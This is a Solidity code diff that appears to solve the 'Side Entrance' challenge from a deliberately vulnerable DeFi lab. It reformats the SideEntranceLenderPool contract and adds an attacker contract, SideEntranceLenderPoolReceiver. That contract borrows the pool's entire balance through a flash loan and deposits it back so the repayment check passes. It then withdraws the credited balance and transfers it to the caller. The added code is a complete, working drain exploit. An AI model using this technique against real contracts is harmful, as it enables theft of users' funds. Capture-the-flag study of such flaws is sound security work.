@@ -14,7 +14,7 @@ interface IFlashLoanEtherReceiver {
 contract SideEntranceLenderPool {
     using Address for address payable;
 
-    mapping (address => uint256) private balances;
+    mapping(address => uint256) private balances;
 
     function deposit() external payable {
         balances[msg.sender] += msg.value;
@@ -29,10 +29,35 @@ contract SideEntranceLenderPool {
     function flashLoan(uint256 amount) external {
         uint256 balanceBefore = address(this).balance;
         require(balanceBefore >= amount, "Not enough ETH in balance");
-        
+
         IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
 
-        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
+        require(
+            address(this).balance >= balanceBefore,
+            "Flash loan hasn't been paid back"
+        );
     }
 }
- 
+
+contract SideEntranceLenderPoolReceiver is IFlashLoanEtherReceiver {
+    SideEntranceLenderPool public s;
+
+    constructor(SideEntranceLenderPool _s) {
+        s = _s;
+    }
+
+    function solve() public {
+        s.flashLoan(address(s).balance);
+    }
+
+    function execute() external payable override {
+        s.deposit{value: address(this).balance}();
+    }
+
+    function takeAll() public {
+        s.withdraw();
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    receive() external payable {}
+}
